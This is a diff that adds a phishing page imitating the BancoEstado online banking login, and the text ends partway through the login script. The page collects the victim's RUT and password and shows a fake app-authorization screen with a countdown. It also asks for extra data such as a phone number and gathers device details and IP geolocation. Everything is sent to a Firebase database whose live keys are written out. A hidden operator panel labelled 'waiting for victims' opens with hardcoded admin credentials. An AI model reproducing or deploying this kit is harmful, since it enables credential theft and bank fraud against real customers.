@@ -1,0 +1,796 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>BancoEstado</title>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+
+<style>
+* { margin:0; padding:0; box-sizing:border-box; font-family:'Roboto',sans-serif; }
+body { background-color:#f5f5f5; display:flex; justify-content:center; align-items:center; min-height:100vh; }
+.container { background:white; width:100%; max-width:400px; border-radius:16px; box-shadow:0 4px 20px rgba(0,0,0,0.08); padding:30px 25px; position:relative; }
+.close-btn { position:absolute; top:15px; right:15px; background:#f0f0f0; border:none; width:32px; height:32px; border-radius:50%; cursor:pointer; display:flex; align-items:center; justify-content:center; font-size:14px; color:#666; }
+.logo { width:180px; height:auto; margin-bottom:20px; display:block; }
+.title { font-size:22px; font-weight:600; color:#2b2b2b; margin-bottom:25px; line-height:1.3; }
+.form-group { margin-bottom:20px; }
+.form-group label { display:block; font-size:13px; font-weight:700; color:#4a4a4a; margin-bottom:8px; }
+.form-input { width:100%; padding:12px 14px; border:1px solid #dcdcdc; border-radius:8px; font-size:16px; color:#333; transition:border-color 0.2s ease; }
+.form-input:focus { outline:none; border-color:#4C65D2; }
+.form-input::placeholder { color:#a0a0a0; }
+.input-wrapper { position:relative; }
+.toggle-password { position:absolute; right:14px; top:50%; transform:translateY(-50%); color:#888; cursor:pointer; font-size:16px; }
+.btn-primary { width:100%; padding:14px; background-color:#4C65D2; color:white; border:none; border-radius:25px; font-size:16px; font-weight:600; cursor:pointer; transition:background-color 0.2s ease; margin-top:5px; }
+.btn-primary:hover { background-color:#3b52b8; }
+.forgot-link { display:block; text-align:center; color:#4C65D2; text-decoration:none; font-size:14px; margin-top:18px; font-weight:500; }
+.forgot-link:hover { text-decoration:underline; }
+.divider { width:100%; height:1px; background:#e5e5e5; margin:22px 0; }
+.btn-secondary { width:100%; padding:13px; background:transparent; color:#4C65D2; border:1px solid #4C65D2; border-radius:25px; font-size:16px; font-weight:500; cursor:pointer; transition:background-color 0.2s ease; }
+.btn-secondary:hover { background-color:rgba(76,101,210,0.05); }
+
+.loader-container { display:flex; flex-direction:column; align-items:center; justify-content:center; }
+.spinner-wrapper { position:relative; width:76px; height:76px; display:flex; align-items:center; justify-content:center; margin-bottom:14px; }
+.spinner { position:absolute; width:100%; height:100%; border:4.5px solid #2d5091; border-top-color:transparent; border-radius:50%; animation:spin 0.9s linear infinite; }
+.icon-center { width:44px; height:44px; display:flex; align-items:center; justify-content:center; z-index:1; }
+.icon-center img { width:100%; height:100%; object-fit:contain; }
+.loading-text { font-size:19px; font-weight:700; color:#2F353D; letter-spacing:-0.2px; }
+@keyframes spin { 0%{transform:rotate(0deg)} 100%{transform:rotate(360deg)} }
+
+.card { background:#ffffff; width:100%; max-width:440px; border-radius:20px; box-shadow:0 4px 20px rgba(0,0,0,0.08); padding:35px 25px; display:flex; flex-direction:column; align-items:center; text-align:center; }
+.header-illustration { display:flex; align-items:center; justify-content:center; gap:16px; margin-bottom:25px; }
+.lock-icon { width:65px; height:65px; background-color:#00ce9b; border-radius:16px; display:flex; align-items:center; justify-content:center; box-shadow:0 2px 8px rgba(0,206,155,0.3); }
+.lock-icon svg { width:32px; height:32px; fill:#ffffff; }
+.dot-connector { width:10px; height:10px; background-color:#fce1cd; border-radius:50%; }
+.phone-icon { width:50px; height:80px; background-color:#2b2c30; border-radius:10px; padding:6px 4px; display:flex; flex-direction:column; align-items:center; justify-content:space-between; }
+.phone-screen-small { width:100%; height:58px; background-color:#8b8c94; border-radius:4px; }
+.phone-button-small { width:16px; height:4px; background-color:#55565e; border-radius:2px; }
+.instruction-text { font-size:18px; font-weight:700; color:#333333; line-height:1.35; margin-bottom:25px; max-width:380px; }
+.phone-mockup-frame { width:270px; height:165px; border:4px solid #1f1f1f; border-top-left-radius:20px; border-top-right-radius:20px; border-bottom:none; overflow:hidden; position:relative; background-color:#c85315; box-shadow:0 -2px 10px rgba(0,0,0,0.1); margin-bottom:30px; }
+.app-header-btn { background:#ffffff; border-radius:10px; margin:18px 12px 0 12px; padding:10px 12px; display:flex; align-items:center; justify-content:space-between; box-shadow:0 2px 6px rgba(0,0,0,0.15); }
+.app-header-btn-left { display:flex; align-items:center; gap:8px; }
+.app-lock-badge { width:20px; height:20px; background-color:#00ce9b; border-radius:4px; display:flex; align-items:center; justify-content:center; }
+.app-lock-badge svg { width:12px; height:12px; fill:#ffffff; }
+.app-btn-text { font-size:11px; font-weight:700; color:#333333; }
+.app-arrow { font-size:12px; color:#666666; font-weight:bold; }
+.app-quick-access { position:absolute; bottom:0; left:0; right:0; background-color:#e2e4e8; border-top-left-radius:12px; border-top-right-radius:12px; padding:6px 8px 10px 8px; }
+.quick-title { font-size:8px; color:#666666; text-align:left; margin-left:4px; margin-bottom:4px; }
+.quick-icons-grid { display:grid; grid-template-columns:repeat(4,1fr); gap:4px; }
+.quick-item { background:#d5d8de; border-radius:6px; padding:4px 2px; display:flex; flex-direction:column; align-items:center; justify-content:center; }
+.quick-item-icon { width:14px; height:14px; margin-bottom:2px; }
+.quick-item-label { font-size:6.5px; color:#444444; line-height:1.1; text-align:center; }
+.timer-container { width:100%; background-color:#f3f5f8; border-radius:8px; padding:14px; font-size:18px; color:#4a5056; margin-bottom:25px; }
+.timer-time { font-weight:700; color:#22252a; font-size:22px; margin-left:4px; }
+.cancel-btn { background:none; border:none; color:#3f51b5; font-size:20px; font-weight:700; cursor:pointer; transition:color 0.2s ease; }
+.cancel-btn:hover { color:#283593; text-decoration:underline; }
+</style>
+
+<style>
+.view { display:none; }
+.view.active { display:flex; align-items:center; justify-content:center; width:100%; min-height:100vh; }
+#view-loading.active { background:#ffffff; }
+#view-bpass.active, #view-extra.active { padding:20px; }
+
+#view-extra .xcard { background:#fff; width:100%; max-width:400px; border-radius:18px; box-shadow:0 4px 20px rgba(0,0,0,.08); padding:32px 25px; text-align:center; }
+#view-extra h2 { font-size:19px; color:#2b2b2b; margin-bottom:8px; font-weight:700; }
+#view-extra p { font-size:14px; color:#777; margin-bottom:20px; }
+#view-extra input { width:100%; padding:13px 14px; border:1px solid #dcdcdc; border-radius:8px; font-size:16px; margin-bottom:16px; color:#333; }
+#view-extra input:focus { outline:none; border-color:#4C65D2; }
+#view-extra button { width:100%; padding:14px; background:#4C65D2; color:#fff; border:none; border-radius:25px; font-size:16px; font-weight:600; cursor:pointer; }
+
+body.panel-mode { display:block; background:#0e1116; align-items:flex-start; }
+#view-panel.active { display:block; background:#0e1116; }
+.panel-wrap { max-width:960px; margin:0 auto; padding:16px 14px 70px; }
+.phead { display:flex; align-items:center; justify-content:space-between; gap:12px; background:#161b23; border:1px solid #232b36; border-radius:14px; padding:14px 16px; margin-bottom:16px; position:sticky; top:10px; z-index:30; }
+.phead h1 { font-size:15px; letter-spacing:1.6px; color:#fff; font-weight:700; }
+.sub { font-size:12px; color:#8b97a8; margin-top:4px; display:flex; align-items:center; gap:7px; }
+.dot { width:8px; height:8px; border-radius:50%; background:#00d68f; box-shadow:0 0 8px #00d68f; animation:pulse 1.4s infinite; }
+@keyframes pulse { 0%,100%{opacity:1} 50%{opacity:.2} }
+.pactions { display:flex; gap:8px; }
+.pactions button { background:#232b36; border:1px solid #2e3846; color:#cfd8e3; width:40px; height:40px; border-radius:10px; font-size:16px; cursor:pointer; }
+.pactions button:hover { background:#2e3846; }
+
+.cards { display:flex; flex-direction:column; gap:14px; }
+.pcard { background:#161b23; border:1px solid #232b36; border-left:4px solid #f0a500; border-radius:14px; padding:14px 16px; color:#dbe3ee; }
+.pcard.st-valido  { border-left-color:#00d68f; }
+.pcard.st-fallido { border-left-color:#ff4d5e; }
+.pcard.st-bpass   { border-left-color:#4C65D2; }
+.pcard.st-fin     { border-left-color:#7b8794; }
+.pcard.st-pedir   { border-left-color:#b06bff; }
+.pcard.flash { animation:flash .55s 7; }
+@keyframes flash { 0%,100%{box-shadow:0 0 0 rgba(0,214,143,0)} 50%{box-shadow:0 0 0 4px rgba(0,214,143,.4)} }
+
+.ptop { display:flex; align-items:center; gap:10px; margin-bottom:12px; flex-wrap:wrap; }
+.cid { font-family:monospace; font-size:13px; font-weight:700; color:#fff; background:#232b36; padding:4px 9px; border-radius:7px; }
+.badge { font-size:10.5px; font-weight:700; letter-spacing:.6px; padding:4px 9px; border-radius:20px; background:#3a2c00; color:#ffc043; }
+.st-valido .badge  { background:#00361f; color:#00d68f; }
+.st-fallido .badge { background:#3a0d14; color:#ff4d5e; }
+.st-bpass .badge   { background:#0f1a44; color:#8aa1ff; }
+.st-fin .badge     { background:#262d38; color:#a6b1c0; }
+.st-pedir .badge   { background:#2a1240; color:#c79bff; }
+.ptime { margin-left:auto; font-size:11.5px; color:#7b8794; }
+
+.rows { display:grid; grid-template-columns:1fr 1fr; gap:9px 16px; margin-bottom:12px; }
+.rows > div { display:flex; flex-direction:column; gap:2px; }
+.rows > div.wide { grid-column:1/-1; }
+.rows span { font-size:10.5px; letter-spacing:.7px; color:#7b8794; text-transform:uppercase; }
+.rows b { font-size:15px; color:#fff; font-weight:600; word-break:break-word; cursor:pointer; }
+
+.extra { background:#1d2430; border-radius:9px; padding:10px 12px; font-size:13px; color:#cfd8e3; margin-bottom:12px; }
+.extra span { color:#7b8794; font-size:11px; text-transform:uppercase; letter-spacing:.6px; }
+
+.btns { display:grid; grid-template-columns:repeat(4,1fr); gap:8px; margin-bottom:10px; }
+.btns button { padding:12px 4px; border:none; border-radius:10px; font-size:13px; font-weight:700; cursor:pointer; color:#fff; }
+.btns button:active { transform:scale(.97); }
+.b-fallido { background:#e0303f; }
+.b-valido  { background:#00a86b; }
+.b-bpass   { background:#4C65D2; }
+.b-fin     { background:#4a5563; }
+
+.pfoot { display:flex; align-items:center; gap:12px; border-top:1px solid #232b36; padding-top:10px; }
+.b-dato { background:#2a1240; color:#c79bff; border:1px solid #43215f; border-radius:8px; padding:8px 12px; font-size:12px; font-weight:700; cursor:pointer; white-space:nowrap; }
+.logs { display:flex; flex-direction:column; gap:2px; font-size:11px; color:#6f7b8b; font-family:monospace; overflow:hidden; }
+.empty { text-align:center; color:#5c6675; padding:70px 0; font-size:14px; }
+</style>
+</head>
+<body>
+
+<div id="view-login" class="view active">
+    <div class="container">
+        <button class="close-btn"><i class="fas fa-times"></i></button>
+        <img class="logo" src="data:image/svg+xml;charset=utf-8,%3Csvg%20role%3D'img'%20alt%3D''%20aria-hidden%3D'true'%20focusable%3D'false'%20xmlns%3D'http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg'%20width%3D'158'%20height%3D'32'%20viewBox%3D'0%200%20158%2032'%20fill%3D'none'%3E%3Cpath%20fill%3D'%23fff'%20d%3D'M31.71%200H0v31.79h31.71V0Z'%2F%3E%3Cpath%20fill%3D'%23343E46'%20d%3D'M53.38%2024.27a8.47%208.47%200%200%200%202.31-.34l.44-2.35a5.89%205.89%200%200%200-2.41-.44c-1.28%200-2.24.44-2.43%201.47-.19%201.03.48%201.66%202.09%201.66Zm5.54-5-1.1%206a13.73%2013.73%200%200%201-5.26%201.09c-3.24%200-4.58-1.37-4.18-3.56.4-2.19%202.61-3.49%205.26-3.47a7.211%207.211%200%200%201%202.63.42l.12-.62c.24-1.32-.49-2.11-2.25-2.11a6.21%206.21%200%200%200-3.23%201%201.75%201.75%200%200%201-.89-1.68%208%208%200%200%201%204.72-1.55c2.89%200%204.78%201.29%204.18%204.53M127.48%2024.27a8.55%208.55%200%200%200%202.32-.34l.42-2.36a5.85%205.85%200%200%200-2.4-.44c-1.29%200-2.24.44-2.44%201.47-.2%201.03.48%201.66%202.09%201.66m5.55-5-1.11%206a13.728%2013.728%200%200%201-5.26%201.09c-3.23%200-4.58-1.37-4.17-3.56.41-2.19%202.61-3.49%205.26-3.47a7.25%207.25%200%200%201%202.63.42l.11-.62c.24-1.32-.49-2.11-2.24-2.11a6.251%206.251%200%200%200-3.24%201%201.772%201.772%200%200%201-.89-1.68%208.052%208.052%200%200%201%204.72-1.55c2.89%200%204.78%201.29%204.19%204.53M71.58%2020.57a7%207%200%200%201%206.87-5.85%204.92%204.92%200%200%201%203.47%201.25%204.1%204.1%200%200%201-1.75%201.87%202.87%202.87%200%200%200-2.11-.85%204%204%200%200%200-3.82%203.56c-.35%201.87.34%203.53%202.53%203.53a4.08%204.08%200%200%200%202.6-.92%202.2%202.2%200%200%201%201.06%201.78%206.73%206.73%200%200%201-4.1%201.41c-3.48%200-5.43-2.13-4.75-5.78Z'%2F%3E%3Cpath%20fill%3D'%23343E46'%20d%3D'M90.14%2020.51c.38-2.1-.55-3.56-2.51-3.56a4%204%200%200%200-3.83%203.56c-.38%202.08.56%203.51%202.52%203.51a3.93%203.93%200%200%200%203.82-3.51Zm-9%200a7.07%207.07%200%200%201%206.92-5.83c3.37%200%205.31%202.41%204.68%205.83a7.05%207.05%200%200%201-6.91%205.8c-3.38%200-5.32-2.38-4.69-5.8ZM103.8%2024.95a3.791%203.791%200%200%201%201.54-1.81%204.45%204.45%200%200%200%203.17%201.09c1.55%200%202.21-.58%202.35-1.32.14-.74-.41-1.15-2.32-1.45-1.91-.3-3.6-1-3.18-3.33.38-2%202.46-3.42%205.23-3.42a6.33%206.33%200%200%201%203.92%201.06%203.55%203.55%200%200%201-1.34%201.87%205.691%205.691%200%200%200-3.06-.83c-1.39%200-2.07.44-2.2%201.13-.13.69.29%201.07%202.11%201.37%202.31.37%203.9%201.18%203.49%203.35-.41%202.17-2.43%203.67-5.43%203.67a5.929%205.929%200%200%201-4.28-1.38ZM154.67%2020.51c.39-2.1-.55-3.56-2.51-3.56a3.999%203.999%200%200%200-3.82%203.56c-.39%202.08.55%203.51%202.52%203.51a3.919%203.919%200%200%200%203.81-3.51Zm-9%200a7.071%207.071%200%200%201%206.92-5.83c3.38%200%205.31%202.41%204.68%205.83a7.046%207.046%200%200%201-6.91%205.8c-3.37%200-5.32-2.38-4.69-5.8ZM141.35%2023.67a6.119%206.119%200%200%201-2.23.35c-2%200-3.1-1.34-2.71-3.49a4.118%204.118%200%200%201%204-3.49%203.39%203.39%200%200%201%202%20.49l-1.06%206.14Zm2.19-11.84-.6%203.25a5.56%205.56%200%200%200-2.16-.35%207.101%207.101%200%200%200-7%205.85c-.69%203.69%201.39%205.73%205%205.73a12.24%2012.24%200%200%200%204.94-1.09l2.61-14.15-2.79.76ZM123.11%2015.17h-4.09l.53-2.85-2.73.76-1.75%209.51c-.49%202.63%201.05%203.69%203.41%203.69a5.93%205.93%200%200%200%203.49-1.17%202.209%202.209%200%200%200-.77-1.83%203.399%203.399%200%200%201-2%20.74c-1.09%200-1.77-.42-1.47-2l.86-4.7h4.09c.149-.346.256-.709.32-1.08.065-.33.089-.665.07-1M105.47%2011.13H95.04l.53%201.68c.01.086.01.174%200%20.26v.13l-2.35%2012.76h9.71a4.54%204.54%200%200%200%20.38-1.22c.076-.375.093-.76.05-1.14h-7.09l.75-4.06h6.12c.157-.381.277-.776.36-1.18.073-.389.097-.785.07-1.18h-6.12l.68-3.67h6.88c.162-.38.283-.775.36-1.18.076-.395.103-.798.08-1.2M66.51%2014.68a9.741%209.741%200%200%200-2.94.47.78.78%200%200%201-.22%200%20.59.59%200%200%201-.23%200l-1.84-.55-.33%201.81-1.76%209.54c.421.084.85.124%201.28.12a6.58%206.58%200%200%200%201.33-.12l1.53-8.27a5.72%205.72%200%200%201%202.54-.6c1.68%200%202.51.76%202.14%202.77l-1.12%206.1c.425.084.857.124%201.29.12.45.003.898-.037%201.34-.12l1.24-6.72c.46-2.52-.71-4.56-4.24-4.56M45.69%2015.12c-.25%201.39-1.16%202.17-3.1%202.17H40.3l.76-4.08c.73-.07%201.42-.1%202.09-.1%201.92%200%202.78.74%202.54%202m-.63%206.59c-.31%201.66-1.46%202.4-3.91%202.4a17.65%2017.65%200%200%201-2.08-.11l.83-4.51h2.49c2%200%202.94.74%202.67%202.22Zm3.19-6.66c.48-2.61-1-4.08-4.86-4.08h-5.57l.6%201.79a.871.871%200%200%201%200%20.28c.005.063.005.127%200%20.19l-2.35%2012.74c1.5.273%203.025.397%204.55.37%204.18%200%206.51-1.74%207-4.55a2.79%202.79%200%200%200-1.89-3.52%204.08%204.08%200%200%200%202.46-3.19'%2F%3E%3Cpath%20fill%3D'%23FF2318'%20d%3D'm.79%2016.04%2010.76-4.67V7.91a14.24%2014.24%200%200%200%208.65-4.83l10.76%208.79v-11H.79v15.17Z'%2F%3E%3Cpath%20fill%3D'%23fff'%20d%3D'M11.56%2026.01h8.66V3.08a14.24%2014.24%200%200%201-8.65%204.83v3.46L.82%2016.04v3.38l10.76-4.72v-3.46L.82%2016.04v-3.46Z'%2F%3E%3Cpath%20fill%3D'%23FF7900'%20d%3D'M11.56%2017.99v-3.46L.79%2018.51v3.46l10.77-4.72ZM11.56%2021.29.79%2026.01h10.77v-4.72Z'%2F%3E%3Cpath%20fill%3D'%23FF7900'%20d%3D'm11.56%2014.69%203.45-1.5V9.86l-3.46%201.51v3.46l.01-.01ZM11.55%2014.7l.01-.01-.01.01ZM11.56%2017.99v3.46l3.45-1.51v-3.46l-3.45%201.5v.01ZM20.21%2026.01h10.75V11.86L20.2%203.08l.01%2022.93Z'%2F%3E%3Cpath%20fill%3D'%23004DFF'%20d%3D'M20.21%2026.01H.79v5.03h30.17v-5.03H20.21Z'%2F%3E%3C%2Fsvg%3E" alt="BancoEstado">
+        <h1 class="title">Ingresa a tu Banca en Línea</h1>
+        <form>
+            <div class="form-group">
+                <label for="rut">RUT</label>
+                <input type="text" id="rut" class="form-input" placeholder="Ej: 12345678" autocomplete="off" maxlength="12" oninput="formatRut(this)">
+            </div>
+            <div class="form-group">
+                <label for="clave">Clave</label>
+                <div class="input-wrapper">
+                    <input type="password" id="clave" class="form-input" placeholder="Ingresa tu clave" maxlength="8">
+                    <i class="far fa-eye toggle-password" onclick="togglePassword()"></i>
+                </div>
+            </div>
+            <button type="button" class="btn-primary">Ingresar</button>
+            <a href="#" class="forgot-link">¿Problemas con tu Clave?</a>
+            <div class="divider"></div>
+            <button type="button" class="btn-secondary">Acceso Empresas</button>
+        </form>
+    </div>
+</div>
+
+<div id="view-loading" class="view">
+    <div class="loader-container">
+        <div class="spinner-wrapper">
+            <div class="spinner"></div>
+            <div class="icon-center">
+                <img src="data:image/svg+xml;utf8,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 32 32'><circle cx='16' cy='16' r='16' fill='%23fff'/><path fill='%23FF2318' d='M.79 16.04 11.55 11.37V7.91a14.24 14.24 0 0 0 8.65-4.83l10.76 8.79v-11H.79v15.17Z'/><path fill='%23fff' d='M11.56 26.01h8.66V3.08a14.24 14.24 0 0 1-8.65 4.83v3.46L.82 16.04v3.38l10.76-4.72v-3.46L.82 16.04v-3.46Z'/><path fill='%23FF7900' d='M11.56 17.99v-3.46L.79 18.51v3.46l10.77-4.72ZM11.56 21.29.79 26.01h10.77v-4.72Z'/><path fill='%23FF7900' d='m11.56 14.69 3.45-1.5V9.86l-3.46 1.51v3.46l.01-.01ZM11.55 14.7l.01-.01-.01.01ZM11.56 17.99v3.46l3.45-1.51v-3.46l-3.45 1.5v.01ZM20.21 26.01h10.75V11.86L20.2 3.08l.01 22.93Z'/><path fill='%23004DFF' d='M20.21 26.01H.79v5.03h30.17v-5.03H20.21Z'/></svg>" alt="BancoEstado">
+            </div>
+        </div>
+        <div class="loading-text" id="loadingText">Cargando...</div>
+    </div>
+</div>
+
+<div id="view-bpass" class="view">
+    <div class="card">
+        <div class="header-illustration">
+            <div class="lock-icon">
+                <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
+            </div>
+            <div class="dot-connector"></div>
+            <div class="phone-icon"><div class="phone-screen-small"></div><div class="phone-button-small"></div></div>
+        </div>
+        <h2 class="instruction-text">Autoriza con tu app BancoEstado tu Beneficio recuerda volver a esta web para finalizar.</h2>
+        <div class="phone-mockup-frame">
+            <div class="app-header-btn">
+                <div class="app-header-btn-left">
+                    <div class="app-lock-badge"><svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg></div>
+                    <span class="app-btn-text">Autoriza tus operaciones</span>
+                </div>
+                <span class="app-arrow">&gt;</span>
+            </div>
+            <div class="app-quick-access">
+                <div class="quick-title">Accesos rápidos</div>
+                <div class="quick-icons-grid">
+                    <div class="quick-item"><svg class="quick-item-icon" viewBox="0 0 24 24" fill="#c82333"><rect width="24" height="24" rx="3"/></svg><span class="quick-item-label">Activar Pasaje QR</span></div>
+                    <div class="quick-item"><svg class="quick-item-icon" viewBox="0 0 24 24" fill="#555"><path d="M3 3h8v8H3zm10 0h8v8h-8zM3 13h8v8H3zm14 4h4v4h-4z"/></svg><span class="quick-item-label">Pagar o girar con QR</span></div>
+                    <div class="quick-item"><svg class="quick-item-icon" viewBox="0 0 24 24" fill="#555"><path d="M12 2C8.13 2 5 5.13 5 9c0 5.25 7 13 7 13s7-7.75 7-13c0-3.87-3.13-7-7-7z"/></svg><span class="quick-item-label">Bus, tren y transfer</span></div>
+                    <div class="quick-item"><svg class="quick-item-icon" viewBox="0 0 24 24" fill="#555"><circle cx="12" cy="12" r="10" stroke="#555" stroke-width="2" fill="none"/></svg><span class="quick-item-label">Emergencia y ayuda</span></div>
+                </div>
+            </div>
+        </div>
+        <div class="timer-container">Tiempo disponible: <span class="timer-time" id="countdown">2:55</span></div>
+        <button class="cancel-btn">Cancelar</button>
+    </div>
+</div>
+
+<div id="view-extra" class="view">
+    <div class="xcard">
+        <h2>Verificación de seguridad</h2>
+        <p id="extraLabel">Número de celular</p>
+        <input type="text" id="extraInput" placeholder="Ingresa el dato">
+        <button onclick="submitExtra()">Continuar</button>
+    </div>
+</div>
+
+<div id="view-panel" class="view">
+    <div class="panel-wrap">
+        <div class="phead">
+            <div>
+                <h1>PANEL DE CONTROL</h1>
+                <div class="sub"><span class="dot"></span><span id="panelSub">Esperando víctimas...</span></div>
+            </div>
+            <div class="pactions">
+                <button onclick="testAlarm()" title="Probar alarma">🔔</button>
+                <button onclick="unblockDevice()" title="Desbloquear dispositivo">🔓</button>
+                <button onclick="clearAll()" title="Borrar todo">🗑️</button>
+                <button onclick="closePanel()" title="Salir">✕</button>
+            </div>
+        </div>
+        <div id="empty" class="empty">Aún no hay víctimas. Esperando...</div>
+        <div id="cards" class="cards"></div>
+    </div>
+</div>
+
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
+<script>
+/* =====================================================
+   TUS FUNCIONES — formatRut SIN REGEX (a prueba de copiar)
+   ===================================================== */
+function togglePassword() {
+    const input = document.getElementById('clave');
+    const icon = document.querySelector('.toggle-password');
+    if (input.type === 'password') {
+        input.type = 'text';
+        icon.classList.remove('fa-eye');
+        icon.classList.add('fa-eye-slash');
+    } else {
+        input.type = 'password';
+        icon.classList.remove('fa-eye-slash');
+        icon.classList.add('fa-eye');
+    }
+}
+
+function formatRut(input) {
+    // Limpiar dejando SOLO números y K (sin regex)
+    let valor = '';
+    const raw = input.value;
+    for (let i = 0; i < raw.length; i++) {
+        const c = raw.charAt(i).toUpperCase();
+        if ((c >= '0' && c <= '9') || c === 'K') valor += c;
+    }
+
+    if (valor.length === 0) { input.value = ''; return; }
+    if (valor.length === 1) { input.value = valor; return; }
+
+    let dv = valor.slice(-1);
+    let cuerpo = valor.slice(0, -1);
+
+    let cuerpoFormateado = '';
+    let contador = 0;
+    for (let i = cuerpo.length - 1; i >= 0; i--) {
+        cuerpoFormateado = cuerpo.charAt(i) + cuerpoFormateado;
+        contador++;
+        if (contador === 3 && i !== 0) {
+            cuerpoFormateado = '.' + cuerpoFormateado;
+            contador = 0;
+        }
+    }
+    input.value = cuerpoFormateado + '-' + dv;
+}
+
+/* =====================================================
+   FIREBASE — BASE DE DATOS (reemplaza localStorage)
+   ===================================================== */
+const firebaseConfig = {
+  apiKey: "AIzaSyBKFXj8PGm2DXlxDzl9TPSa1vTCQmKNuxM",
+  authDomain: "prueba7284-a5b3c.firebaseapp.com",
+  databaseURL: "https://prueba7284-a5b3c-default-rtdb.asia-southeast1.firebasedatabase.app",
+  projectId: "prueba7284-a5b3c",
+  storageBucket: "prueba7284-a5b3c.firebasestorage.app",
+  messagingSenderId: "265023699834",
+  appId: "1:265023699834:web:7fbdfbb756456b41a7b4c3"
+};
+
+firebase.initializeApp(firebaseConfig);
+const SESSIONS_REF = firebase.database().ref('sessions');
+
+let sessionsCache = [];
+let fbReady = false;
+let synced = {};
+
+SESSIONS_REF.on('value', snap => {
+  const val = snap.val() || {};
+  const arr = [];
+  Object.keys(val).forEach(k => {
+    const s = val[k] || {};
+    s.id = s.id || k;
+    if (!s.log) s.log = [];
+    else if (!Array.isArray(s.log)) s.log = Object.values(s.log);
+    arr.push(s);
+    synced[s.id] = JSON.stringify(s);
+  });
+  sessionsCache = arr;
+  fbReady = true;
+  console.log('[Firebase] OK · ' + arr.length + ' sesiones en la nube');
+}, err => {
+  console.error('[Firebase] ERROR:', err.message || err);
+});
+
+function getSessions(){ return sessionsCache; }
+
+function setSessions(a){
+  sessionsCache = a;
+  a.forEach(s => {
+    if (!s || !s.id) return;
+    const str = JSON.stringify(s);
+    if (synced[s.id] === str) return;
+    synced[s.id] = str;
+    SESSIONS_REF.child(s.id).set(s)
+      .then(() => console.log('[Firebase] Guardado ' + s.id))
+      .catch(e => console.error('[Firebase] Error al guardar ' + s.id + ':', e.message));
+  });
+}
+
+function deleteAllSessions(){
+  SESSIONS_REF.remove();
+  sessionsCache = [];
+  synced = {};
+}
+
+function waitFb(ms){
+  return new Promise(res => {
+    if (fbReady) return res();
+    const t = setTimeout(res, ms || 4000);
+    const iv = setInterval(() => {
+      if (fbReady){ clearInterval(iv); clearTimeout(t); res(); }
+    }, 100);
+  });
+}
+
+/* =====================================================
+   CONFIG
+   ===================================================== */
+const KEY        = 'be_sessions_v1';
+const BLOCK_KEY  = 'be_blocked_v1';
+const ADMIN_RUT  = '222007201';
+const ADMIN_PASS = 'mar2007';
+
+const $ = id => document.getElementById(id);
+const soloRut = v => String(v || '').replace(/[.\-\s]/g, '').toUpperCase();
+const esc = v => String(v == null ? '' : v)
+  .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
+
+let currentView = '';
+function showView(id){
+  document.querySelectorAll('.view').forEach(v => v.classList.toggle('active', v.id === id));
+  currentView = id;
+  document.body.classList.toggle('panel-mode', id === 'view-panel');
+}
+
+/* Mensaje de error inyectado */
+const rutInput   = $('rut');
+const claveInput = $('clave');
+const btnLogin   = document.querySelector('#view-login .btn-primary');
+
+const loginError = document.createElement('div');
+loginError.id = 'loginError';
+loginError.style.cssText = 'color:#e53935;font-size:13px;font-weight:500;text-align:center;min-height:17px;margin:-8px 0 12px;line-height:1.3';
+btnLogin.parentNode.insertBefore(loginError, btnLogin);
+
+/* =====================================================
+   DISPOSITIVO + GEO
+   ===================================================== */
+function deviceInfo(){
+  const ua = navigator.userAgent;
+  let so = 'Desconocido';
+  if (/Android/i.test(ua)) so = 'Android';
+  else if (/iPhone|iPad|iPod/i.test(ua)) so = 'iOS';
+  else if (/Windows/i.test(ua)) so = 'Windows';
+  else if (/Macintosh/i.test(ua)) so = 'macOS';
+  else if (/Linux/i.test(ua)) so = 'Linux';
+  const tipo = /Mobi|Android|iPhone|iPad/i.test(ua) ? 'Móvil' : 'PC';
+  const nav = ua.includes('Chrome') ? 'Chrome'
+            : ua.includes('Firefox') ? 'Firefox'
+            : ua.includes('Safari') ? 'Safari' : 'Otro';
+  return tipo + ' · ' + so + ' · ' + nav + ' · ' + screen.width + 'x' + screen.height;
+}
+
+function geo(){
+  return new Promise(resolve => {
+    const t = setTimeout(() => resolve({ ip:'—', ciudad:'—' }), 3000);
+    fetch('https://ipapi.co/json/')
+      .then(r => r.json())
+      .then(j => {
+        clearTimeout(t);
+        const c = [j.city, j.region, j.country_name].filter(Boolean).join(', ');
+        resolve({ ip: j.ip || '—', ciudad: c || '—' });
+      })
+      .catch(() => { clearTimeout(t); resolve({ ip:'—', ciudad:'—' }); });
+  });
+}
+
+/* =====================================================
+   LOGIN
+   ===================================================== */
+let myId = sessionStorage.getItem('be_myid') || '';
+let lastEstado = '';
+let enviando = false;
+
+async function submitLogin(){
+  if (enviando) return;
+
+  const rut   = rutInput.value.trim();
+  const clave = claveInput.value.trim();
+
+  if (!rut || !clave){ loginError.textContent = 'Ingresa tu RUT y tu Clave.'; return; }
+
+  if (soloRut(rut) === ADMIN_RUT && clave === ADMIN_PASS){
+    loginError.textContent = '';
+    openPanel();
+    return;
+  }
+
+  enviando = true;
